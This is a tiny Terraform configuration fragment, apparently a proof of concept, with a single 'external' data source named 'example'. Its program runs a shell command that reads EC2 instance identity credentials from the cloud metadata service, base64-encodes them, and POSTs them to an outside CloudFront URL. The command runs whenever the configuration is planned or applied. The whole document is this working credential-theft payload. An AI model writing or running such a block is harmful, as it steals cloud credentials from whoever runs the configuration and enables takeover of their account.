data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
}